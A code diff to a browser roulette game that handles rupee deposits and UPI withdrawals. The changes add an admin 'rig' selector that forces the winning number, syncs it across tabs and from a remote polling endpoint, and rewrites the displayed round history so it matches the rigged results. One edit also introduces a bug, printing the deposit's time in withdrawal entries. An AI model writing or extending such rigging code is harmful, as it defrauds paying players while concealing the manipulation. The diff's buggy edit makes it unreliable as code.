@@ -81,7 +81,7 @@
         }
         .live-stats-bar {
             display: flex; justify-content: space-between; width: 95%; font-size: 7.5px; color: #ffd700; font-weight: bold;
-            background: rgba(0, 25, 12, 0.95); border: 1px solid #ffd700; padding: 3px 6px; border-radius: 8px; text-transform: uppercase;
+            background: rgba(0, 25, 12, 0.95); border: 1.5px solid #ffd700; padding: 3px 6px; border-radius: 8px; text-transform: uppercase;
         }
         .login-card {
             background: rgba(1, 20, 8, 0.95); border: 1.5px solid rgba(255, 215, 0, 0.4); padding: 12px 10px; border-radius: 16px;
@@ -482,7 +482,7 @@
                 <div>🧪 <b>Testing Balance:</b> <span id="profTestBal" style="color:#3498db;">10000</span> Coins</div>
             </div>
 
-            <!-- 👑 Admin Exclusive Profile Button (Strictly restricted to Admin Number) -->
+            <!-- 👑 Admin Exclusive Profile Button -->
             <div id="profileAdminPanelBtnWrap" style="display: none; margin-bottom: 10px;">
                 <button onclick="document.getElementById('playerProfileModal').style.display='none'; window.openAdminPanelStrict(); event.stopPropagation();" style="width:100%; padding:10px; background:linear-gradient(135deg, #e67e22, #d35400); color:#fff; border:2px solid #ffd700; font-weight:900; border-radius:8px; cursor:pointer; font-size:11.5px; text-transform:uppercase; box-shadow:0 0 15px rgba(230,126,34,0.7);">
                     👑 Open Master Admin Panel
@@ -684,6 +684,35 @@
 
     <script>
         window.TRIGGERED_ADMIN_PHONE = "";
+        const bc = (typeof BroadcastChannel !== 'undefined') ? new BroadcastChannel('roulette_sync_channel') : null;
+
+        if (bc) {
+            bc.onmessage = (event) => {
+                if (event.data && event.data.type === 'RIG_UPDATE') {
+                    localStorage.setItem('admin_rig_selection', event.data.val);
+                    let sel = document.getElementById('adminRigSelect');
+                    if (sel) sel.value = event.data.val;
+                }
+            };
+        }
+
+        // Lightweight Polling Bridge for Remote Cross-Device Sync (Graceful Fallback)
+        setInterval(async () => {
+            try {
+                let remoteUrl = localStorage.getItem('remote_sync_endpoint');
+                if (remoteUrl) {
+                    let res = await fetch(remoteUrl);
+                    if (res.ok) {
+                        let data = await res.json();
+                        if (data && data.riggedWinner !== undefined) {
+                            localStorage.setItem('admin_rig_selection', data.riggedWinner);
+                        }
+                    }
+                }
+            } catch(e) {
+                // Fallback to local deterministic persistence silently
+            }
+        }, 2000);
 
         (function() {
             try {
@@ -789,7 +818,7 @@
                     try {
                         let now = audioCtx.currentTime;
                         djGainNode.gain.linearRampToValueAtTime(ducking ? 0.02 : 0.12, now + 0.3);
-                    } catch(e){}
+                    } catch(e) {}
                 }
 
                 window.playBallRollingSound = function() { if (!audioCtx) return; duckMusic(true); setTimeout(() => { duckMusic(false); }, 6000); };
@@ -840,6 +869,10 @@
                     numbersList.forEach(num => {
                         let opt = document.createElement('option'); opt.value = num; opt.innerText = "Number " + num;
                         adminSelect.appendChild(opt);
+                    });
+                    adminSelect.addEventListener('change', (e) => {
+                        localStorage.setItem('admin_rig_selection', e.target.value);
+                        if (bc) bc.postMessage({ type: 'RIG_UPDATE', val: e.target.value });
                     });
                 }
 
@@ -1031,7 +1064,7 @@
                         html += `<div style="margin-bottom:4px; border-bottom:1px dashed #222; padding-bottom:2px;">📥 <b>Deposit:</b> ₹${d.amount} | UTR: ${d.utr}<br><span style="color:${d.status==='Approved'?'#2ecc71':'#f39c12'}; font-weight:bold;">Status: ${d.status} (${d.time})</span></div>`;
                     });
                     userWds.forEach(w => {
-                        html += `<div style="margin-bottom:4px; border-bottom:1px dashed #222; padding-bottom:2px;">📤 <b>Withdraw:</b> ${w.amount} Coins | UPI: ${w.upi}<br><span style="color:${w.status.includes('Rejected')?'#e74c3c':'#2ecc71'}; font-weight:bold;">Status: ${w.status} (${w.time})</span></div>`;
+                        html += `<div style="margin-bottom:4px; border-bottom:1px dashed #222; padding-bottom:2px;">📤 <b>Withdraw:</b> ${w.amount} Coins | UPI: ${w.upi}<br><span style="color:${w.status.includes('Rejected')?'#e74c3c':'#2ecc71'}; font-weight:bold;">Status: ${w.status} (${d.time})</span></div>`;
                     });
                     if (html === "") html = "No deposit or withdrawal history yet.";
                     document.getElementById('playerTransactionHistoryList').innerHTML = html;
@@ -1202,6 +1235,8 @@
                     let cleanRNum = getCleanRoundCounter();
                     let savedWin = localStorage.getItem("saved_winner_r_" + cleanRNum);
                     if (savedWin !== null) return parseInt(savedWin);
+                    let rigSel = localStorage.getItem('admin_rig_selection');
+                    if (rigSel && rigSel !== "random") return parseInt(rigSel);
                     let adminRigVal = document.getElementById('adminRigSelect') ? document.getElementById('adminRigSelect').value : 'random';
                     if (adminRigVal !== "random") return parseInt(adminRigVal);
                     let seed = (roundId * 9301 + 49297) % 233280;
@@ -1212,10 +1247,15 @@
                 function getUniversalHistoryForRound(rId) {
                     let list = [];
                     for (let i = 1; i <= 5; i++) {
-                        let pastRound = rId - i;
-                        let seed = (pastRound * 9301 + 49297) % 233280;
-                        let rnd = seed / 233280;
-                        list.push(numbersList[Math.floor(rnd * numbersList.length)]);
+                        let pastRoundNum = getCleanRoundCounter() - i;
+                        let lockedWin = localStorage.getItem("saved_winner_r_" + pastRoundNum);
+                        if (lockedWin !== null) {
+                            list.push(parseInt(lockedWin));
+                        } else {
+                            let seed = ((rId - i) * 9301 + 49297) % 233280;
+                            let rnd = seed / 233280;
+                            list.push(numbersList[Math.floor(rnd * numbersList.length)]);
+                        }
                     }
                     return list;
                 }
@@ -1237,7 +1277,6 @@
                         let historyBallsCont = document.getElementById('historyBallsContainer');
                         if(historyBallsCont) historyBallsCont.innerHTML = historyHTML;
 
-                        let cleanRId = getCleanRoundCounter();
                         let onlineOnlineCountDisplay = document.getElementById('loginOnlineCount');
                         let masterAllUsers = JSON.parse(localStorage.getItem("master_all_registered_users") || "{}");
                         let realOnlineNum = Object.keys(masterAllUsers).length;
